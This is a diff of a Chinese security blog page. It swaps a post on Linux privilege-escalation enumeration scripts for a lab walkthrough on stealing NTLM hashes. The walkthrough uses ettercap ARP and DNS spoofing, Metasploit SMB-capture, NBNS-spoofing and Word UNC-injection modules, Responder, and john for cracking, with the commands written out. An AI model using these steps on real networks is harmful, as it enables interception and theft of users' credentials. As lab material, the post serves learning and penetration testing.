@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>通过脚本升级Linux权限 | 九世的博客</title>
+  <title>NTM_HASH获取实验 | 九世的博客</title>
   <meta name="keywords" content=" Writing ">
-  <meta name="description" content="通过脚本升级Linux权限 | 九世的博客">
+  <meta name="description" content="NTM_HASH获取实验 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1076,9 +1076,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-通过脚本升级Linux权限" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-NTM-HASH获取实验" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">通过脚本升级Linux权限</h1>
+        <h1 class="article-title">NTM_HASH获取实验</h1>
     
     <div class="article-meta">
         
@@ -1094,7 +1094,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-11-11 10:03</time>
+        创建时间:<time class="date" title="更新时间: 2019-10-12 20:30:45">2019-10-12 18:02</time>
         
     </div>
     <div class="article-meta">
@@ -1116,7 +1116,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#目录"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS劫持嗅探获取hash"><span class="toc-text">DNS劫持嗅探获取hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过捕获smb流量获取hash"><span class="toc-text">通过捕获smb流量获取hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过Word获取hash"><span class="toc-text">通过Word获取hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用Responder辅助获取hash"><span class="toc-text">使用Responder辅助获取hash</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1131,97 +1131,69 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文翻译自<a href="http://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/" target="_blank" rel="noopener">Linux Privilege Escalation via Automated Script</a><br><img src="http://img.netbian.com/file/2018/0501/7bfb095480846b26e8fb392e3294ab28.jpg" alt="7bfb095480846b26e8fb392e3294ab28.jpg"></p>
-<p>music:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34179077&auto=1&height=66"></iframe></p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我们都知道，在破坏受害者的机器之后，我们有一个低权限的shell，我们想要升级到更高权限的shell，这个过程称为权限提升。今天在本文中，我们将讨论权限提升的内容以及攻击者如何识别低权限shell可以升级到更高权限的shell。但除此之外，还有一些Linux脚本在尝试升级目标系统上的权限时可能会有用。这通常旨在枚举而不是特定的漏洞/漏洞利用。这种类型的脚本可以节省您的时间。<br>表中的内容<br>介绍<br>权限提升的向量<br>LinuEnum<br>Linuxprivchecker<br>Linux Exploit Suggester 2<br>Bashark<br>BeRoot<br>介绍<br>基本上，权限提升是攻击者攻击受害者机器之后的一个阶段，他试图收集与系统相关的关键信息，如隐藏密码和弱配置服务或应用程序等。所有这些信息都有助于攻击者利用帖子进行攻击反对机器获得更高权限的shell。</p>
-<p>权限提升的向量<br>操作系统详细信息和内核版本<br>安装或运行任何Vulnerable包<br>具有完全控制或修改访问权限的文件和文件夹<br>具有SUID权限的文件<br>映射驱动器（NFS）<br>潜在有趣的文件<br>环境变量路径<br>网络信息（接口，arp，netstat）<br>运行进程<br>Cronjobs<br>用户的Sudo Right<br>通配符注入<br>在Penetration测试中有几个脚本用于快速识别Windows系统上的潜在权限提升向量，今天我们将详细说明每个脚本正在顺利运行。</p>
-<p>LinuEnum<br>脚本本地Linux枚举和权限提升检查Shellscript，它枚举系统配置和LinEnum执行的检查/任务的高级摘要。</p>
-<p>特权访问：诊断当前用户是否具有没有密码的sudo访问权限; root的主目录是否可访问。</p>
-<p>系统信息：主机名，网络详细信息，当前IP等。</p>
-<p>用户信息：当前用户，列出所有用户，包括uid / gid信息，列出root帐户，检查密码哈希是否存储在/ etc / passwd中。</p>
-<p>内核和分发版本详细信息。</p>
-<p>您可以通过以下命令通过github下载它：</p>
-<pre><code>git clone https://github.com/rebootuser/LinEnum.git
-</code></pre><p><img src="https://s1.ax1x.com/2018/11/11/iqNMO1.png" alt="iqNMO1.png"><br>下载此脚本后，您只需 在终端上绑定./LinEnum.sh即可运行它  。因此，它将转储所有获取的数据和系统详细信息。</p>
-<p>让我们分析它给我们带来的结果：</p>
-<p>操作系统和内核信息： 4.15.0-36-generic，Ubuntu-16.04.1<br><img src="https://s1.ax1x.com/2018/11/11/iqNa6A.png" alt="iqNa6A.png"><br>此外…..</p>
-<p>超级用户帐户：root</p>
-<p>Sudo Rights用户：jiu</p>
-<p>主页目录文件权限</p>
-<p>环境信息</p>
-<p>还有更多这样的事情属于邮政剥削。<br><img src="https://s1.ax1x.com/2018/11/11/iqNB0P.md.png" alt="iqNB0P.md.png"><br>这个脚本的功能有以下功能：</p>
-<pre><code>1.列出系统的版本信息
-2.具体分布信息
-3.主机名
-4.目前的权限
-5.以前系统登录到的用户
-6.其他人登录
-7.所有组
-8.列出管理用户
-9.列出/etc/passwd的内容
-10.超级用户账户
-11.Sudo Rights用户
-12.主页目录文件权限
-13.环境信息
-14.路径信息
-15.可用的shell
-16.当前用户的值
-17.密码和存储信息
-18.时间运行事件
-19.文件权限
-20.jobs最后的执行时间
-21.系统计时
-22.网络信息
-23.ARP缓存表
-24.路由表
-25.开启的TCP端口
-26.开启的UDP端口
-27.正在运行的进程和权限
-28.运行进程
-29./ETC/IIT.D/二进制权限
-30./LB/StReD/*CONFIG文件权限
-31.sudo版本
-32.mysql版本
-33.Apache版本
-34.Apache的插件
-35.有用的文件位置
-36.已安装的编译器
-37.敏感文件的权限
-38.所有的conf文件
-39.当前用户的历史文件
-40.执行过的命令
-41.纽约趣味邮件/VAL/mail
-42.docker版本
-43.dorcker文件
-44.所有yml文件
-</code></pre><p>Linuxprivchecker<br>枚举系统配置并运行一些权限提升检查。这是一个python实现，建议特定于系统的漏洞利用。使用wget从其源URL下载脚本。</p>
-<pre><code>wget http://www.securitysift.com/download/linuxprivchecker.py
-</code></pre><p>现在使用这个脚本只需 在终端上键入 python linuxprivchecke.py，这将枚举文件和目录权限/内容。此脚本与LinEnum的工作方式相同，并且可以搜索与系统网络和用户相关的详细信息。</p>
-<p>python linuxprivchecker.py<br><img src="https://s1.ax1x.com/2018/11/11/iqUVBt.png" alt="iqUVBt.png"><br>Root以外用户的可写目录和文件<br><img src="https://s1.ax1x.com/2018/11/11/iqUlcj.md.png" alt="iqUlcj.md.png"></p>
-<p>检查Root的主文件夹是否可访问<br><img src="https://s1.ax1x.com/2018/11/11/iqdCyd.png" alt="iqdCyd.png"></p>
-<p>具有SUID / SGID权限的文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdATP.md.png" alt="iqdATP.md.png"><br>Linux Exploit Suggester 2<br>基于Linux_Exploit_Suggester的下一代漏洞利用建议器。该程序执行’uname -r ‘以获取Linux操作系统发行版，并返回可能的漏洞利用列表。</p>
-<p>此脚本对于快速查找现场和考试环境中的权限提升漏洞非常有用。</p>
-<p>主要改进包括：</p>
-<p>更多的漏洞<br>准确的通配符匹配。这扩大了可搜索漏洞的范围。<br>输出着色，便于查看。<br>还有更多</p>
-<pre><code>git clone https://github.com/jondonas/linux-exploit-suggester-2.git
-cd linux-exploit-suggester-2
-</code></pre><p>这里我就不整这款了</p>
-<p>Bashark<br>Bashark在安全审计的后期开发阶段帮助测试人员和安全研究人员。</p>
-<p>它的特点</p>
-<p>单个Bash脚本<br>轻巧快速<br>多平台：Unix，OSX，Solaris等<br>没有外部依赖<br>免疫启发式和行为分析<br>内置常用shell命令的别名<br>使用面向开发后的功能扩展系统shell<br>隐身，退出时激活自定义清理例程<br>易于扩展（通过创建Bash函数添加新命令）<br>完整标签完成<br>执行以下命令从github下载它：</p>
-<pre><code>git clone https://github.com/TheSecondSun/Bashark.git
-cd Bashark
-</code></pre><p><img src="https://s1.ax1x.com/2018/11/11/iqd40I.md.png" alt="iqd40I.md.png"><br>他的帮助：<br><img src="https://s1.ax1x.com/2018/11/11/iqd7h8.png" alt="iqd7h8.png"><br>扫描出开放的端口和寻找conf文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdb9S.md.png" alt="iqdb9S.md.png"><br>使用getprem选项查看目标计算机的所有二进制文件<br><img src="https://s1.ax1x.com/2018/11/11/iqdLcQ.png" alt="iqdLcQ.png"><br>获取用户名<br><img src="https://s1.ax1x.com/2018/11/11/iqw1jH.png" alt="iqw1jH.png"><br>BeRoot<br>BeRoot项目是一种后期利用工具，用于检查常见的错误配置，以找到升级我们的权限的方法。这个工具没有实现任何利用。它的主要目标不是实现主机的配置评估（列出所有服务，所有进程，所有网络连接等），而是仅打印已被发现作为升级我们的权限的潜在方式的信息。</p>
-<pre><code>git clone https://github.com/AlessandroZ/BeRoot.git
-cd Linux
-chmod 777 beroot.py
-</code></pre><p><img src="https://s1.ax1x.com/2018/11/11/iqww8S.md.png" alt="iqww8S.md.png"><br>枚举出的提权漏洞<br><img src="https://s1.ax1x.com/2018/11/11/iqwruj.png" alt="iqwruj.png"><br>PS：这款工具还有针对windows的</p>
-<p>以上就到这里，先溜</p>
-<p>总结：</p>
-<pre><code>使用好这几款脚本
-
-进行信息收集提权，应该不难
-</code></pre><p>转载请声明：转自422926799.github.io</p>
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>当在内网没有思路的时候可以尝试hash钓鱼来获取突破口，常见的钓鱼方法有</p>
+<ul>
+<li>DNS劫持，嗅探获取hash</li>
+<li>SMB伪造，嗅探获取hash</li>
+<li>Word欺骗，获取hash</li>
+<li>使用Responder辅助获取hash</li>
+</ul>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>kali:192.168.241.157 
+windows server 2008:192.168.241.158
+</code></pre><h2 id="DNS劫持嗅探获取hash"><a href="#DNS劫持嗅探获取hash" class="headerlink" title="DNS劫持嗅探获取hash"></a>DNS劫持嗅探获取hash</h2><p>ettercap配置好DNS劫持，先删除/etc/ettercap/etter.dns里面的内容，然后写入</p>
+<pre><code>* A  192.168.241.157
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXlrjS.png" alt="uXlrjS.png"></p>
+<p>执行以下的操作:</p>
+<pre><code>ettercap -G
+选择网卡
+Hosts-&gt;Scan for hosts-&gt;hosts list
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uX1k4I.png" alt=""></p>
+<p>执行以下操作:</p>
+<pre><code>选择192.168.241.158这个IP
+Mitm-&gt;ARP Poisoning
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uX1KbQ.png" alt="uX1KbQ.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/12/uX14IA.png" alt="uX14IA.png"></p>
+<p>完事，目标机所走的流量都会转发到attack机上<br><img src="https://s2.ax1x.com/2019/10/12/uX8STH.png" alt=""></p>
+<p>此时启动msfconsole，使用以下模块<br><img src="https://s2.ax1x.com/2019/10/12/uXGqsK.png" alt="uXGqsK.png"></p>
+<p>之后，受害机无论访问什么网页都会弹出一个框框，要求输出凭证<br><img src="https://s2.ax1x.com/2019/10/12/uXGgMV.png" alt="uXGgMV.png"></p>
+<p>此时用户如果输入了密码，则会抓到hash<br><img src="https://s2.ax1x.com/2019/10/12/uXJmJs.png" alt="uXJmJs.png"></p>
+<p>使用john破解捕获到的hash<br><img src="https://s2.ax1x.com/2019/10/12/uXJbfs.png" alt="uXJbfs.png"></p>
+<p>PS:记得msf里面设置保存的hash路径，否则不会保存文件。我这里拿别人的图（- -！）</p>
+<h2 id="通过捕获smb流量获取hash"><a href="#通过捕获smb流量获取hash" class="headerlink" title="通过捕获smb流量获取hash"></a>通过捕获smb流量获取hash</h2><p>先用以下模块创建一个临时SMB，然后在启用抓取模块</p>
+<pre><code>use auxiliary/server/capture/smb
+set srvhost 192.168.241.157
+set johnpwfile /root/Desktop_hash
+run
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXD13D.png" alt="uXD13D.png"></p>
+<p>此时可以看见本地的445端口在工作<br><img src="https://s2.ax1x.com/2019/10/12/uXDYDA.png" alt="uXDYDA.png"></p>
+<p>启动smb流量监听模块</p>
+<pre><code>use auxiliary/nbns/nbns_response
+set SPOOFIP 192.168.241.157
+set INTERFACE eth0
+run
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXrVG8.png" alt="uXrVG8.png"></p>
+<p>此时只要受害机访问attack的smb服务并输入用户的话将会捕获hash<br><img src="https://s2.ax1x.com/2019/10/12/uXrBIx.png" alt="uXrBIx.png"></p>
+<p>如图<br><img src="https://s2.ax1x.com/2019/10/12/uXrsJK.png" alt="uXrsJK.png"></p>
+<p>john破解<br><img src="https://s2.ax1x.com/2019/10/12/uXrqyQ.png" alt="uXrqyQ.png"></p>
+<h2 id="通过Word获取hash"><a href="#通过Word获取hash" class="headerlink" title="通过Word获取hash"></a>通过Word获取hash</h2><pre><code>use auxiliary/docx/word_unc_injector
+set LHOST 192.168.241.157
+run
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXszBd.png" alt="uXszBd.png"></p>
+<p>同样使用</p>
+<pre><code>use auxiliary/server/capture/smb
+set srvhost 192.168.241.157
+set johnpwfile /root/Desktop_hash
+run
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXyRUI.png" alt="uXyRUI.png"></p>
+<p>此时在受害机上打开word将捕获到hash<br><img src="https://s2.ax1x.com/2019/10/12/uX2rFA.png" alt="uX2rFA.png"></p>
+<p>收到hash<br><img src="https://s2.ax1x.com/2019/10/12/uX2ROS.png" alt="uX2ROS.png"></p>
+<h2 id="使用Responder辅助获取hash"><a href="#使用Responder辅助获取hash" class="headerlink" title="使用Responder辅助获取hash"></a>使用Responder辅助获取hash</h2><p>仓库地址：</p>
+<pre><code>https://github.com/SpiderLabs/Responder
+</code></pre><p>执行</p>
+<pre><code>python Responder.py -i 192.168.241.157 -I eth0
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXTFdf.png" alt="uXTFdf.png"></p>
+<p>然后在受害机访问192.168.241.157将获取hash<br><img src="https://s2.ax1x.com/2019/10/12/uXTnQs.png" alt="uXTnQs.png"></p>
+<p>在受害者看来是一个访问错误<br><img src="https://s2.ax1x.com/2019/10/12/uXTJW4.png" alt="uXTJW4.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1231,12 +1203,12 @@ chmod 777 beroot.py
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>通过脚本升级Linux权限</p>
+    <p><span class="copy-title">文章标题:</span>NTM_HASH获取实验</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-11-11, 10:03:28</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/7eb122.html" title="通过脚本升级Linux权限">http://422926799.github.io/posts/7eb122.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-12, 18:02:09</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-12, 20:30:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/709f1946.html" title="NTM_HASH获取实验">http://422926799.github.io/posts/709f1946.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
